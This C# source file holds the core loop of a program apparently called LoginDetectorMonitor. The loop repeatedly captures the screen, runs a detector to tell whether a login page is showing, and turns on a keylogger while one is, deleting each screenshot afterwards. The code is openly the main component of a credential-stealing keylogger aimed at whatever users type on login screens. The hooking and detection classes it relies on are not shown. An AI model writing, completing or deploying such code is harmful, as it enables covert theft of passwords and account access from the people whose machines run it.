using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using LoginDetectorMonitor.Configuration;
using LoginDetectorMonitor.Input;
using LoginDetectorMonitor.Logging;

namespace LoginDetectorMonitor.Core
{
    public class LoginMonitor : IDisposable
    {
        private readonly AppConfig _config;
        private readonly ScreenCapture _screenCapture;
        private readonly LoginPageDetector _loginDetector;
        private readonly KeyboardManager _keyboardManager;

        private CancellationTokenSource _cancellationTokenSource;
        private Task _monitoringTask;
        private bool _isDisposed = false;
        private bool _isCurrentlyOnLoginPage = false;

        public LoginMonitor(AppConfig config)
        {
            _config = config;
            _screenCapture = new ScreenCapture(config);
            _loginDetector = new LoginPageDetector(config);
            _keyboardManager = new KeyboardManager();
        }

        public void Start()
        {
            if (_monitoringTask != null && !_monitoringTask.IsCompleted)
            {
                Logger.Log("Monitoring task is already running");
                return;
            }

            _cancellationTokenSource = new CancellationTokenSource();
            _monitoringTask = Task.Run(() => MonitoringLoop(_cancellationTokenSource.Token), _cancellationTokenSource.Token);

            Logger.Log("Login monitoring started");
        }

        public void Stop()
        {
            if (_cancellationTokenSource != null && !_cancellationTokenSource.IsCancellationRequested)
            {
                _cancellationTokenSource.Cancel();
                try
                {
                    _monitoringTask?.Wait(2000); // Give it 2 seconds to shutdown gracefully
                }
                catch (AggregateException)
                {
                    // Task was canceled, which is expected
                }

                _keyboardManager.StopKeylogger();
                Logger.Log("Login monitoring stopped");
            }
        }

        private async Task MonitoringLoop(CancellationToken cancellationToken)
        {
            bool keyloggerInitialized = false;

            // Initialize keyboard hooks but don't start logging yet
            _keyboardManager.Initialize();
            keyloggerInitialized = true;

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Capture screen with optimization to prevent high CPU usage
                    string screenshotPath = await Task.Run(() => _screenCapture.CaptureScreen());

                    if (File.Exists(screenshotPath))
                    {
                        // Check if it's a login page (potentially CPU intensive, so run in a separate task)
                        bool isLoginPage = await Task.Run(() => _loginDetector.IsLoginPage(screenshotPath));

                        // Update login page status and keyboard monitoring
                        if (isLoginPage != _isCurrentlyOnLoginPage)
                        {
                            _isCurrentlyOnLoginPage = isLoginPage;

                            if (isLoginPage)
                            {
                                Logger.Log("Login page detected. Activating keylogger...");
                                Console.WriteLine("Login page detected. Activating keylogger...");
                                _keyboardManager.EnableKeylogger();
                            }
                            else
                            {
                                Logger.Log("Login page no longer detected. Deactivating keylogger...");
                                Console.WriteLine("Login page no longer detected. Deactivating keylogger...");
                                _keyboardManager.DisableKeylogger();
                            }
                        }

                        // Delete the screenshot to save disk space
                        try
                        {
                            File.Delete(screenshotPath);
                            Logger.Log($"Successfully deleted screenshot: {screenshotPath}");
                        }
                        catch (IOException ioEx)
                        {
                            Logger.Log($"IO error deleting screenshot {screenshotPath}: {ioEx.Message}");
                        }
                        catch (UnauthorizedAccessException authEx)
                        {
                            Logger.Log($"Access denied when deleting screenshot {screenshotPath}: {authEx.Message}");
                        }
                        catch (Exception ex)
                        {
                            Logger.Log($"Error deleting screenshot {screenshotPath}: {ex.Message}");
                        }
                    }

                }
                catch (OperationCanceledException)
                {
                    // Expected when cancellation requested
                    break;
                }
                catch (Exception ex)
                {
                    Logger.Log($"Error during capture cycle: {ex.Message}");
                    Console.WriteLine($"Error: {ex.Message}");

                    // Add a small delay to prevent CPU spin in case of repeated errors
                    await Task.Delay(500, cancellationToken);
                }
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_isDisposed)
            {
                if (disposing)
                {
                    Stop();
                    _cancellationTokenSource?.Dispose();
                    _keyboardManager.Dispose();
                }

                _isDisposed = true;
            }
        }

        ~LoginMonitor()
        {
            Dispose(false);
        }
    }
}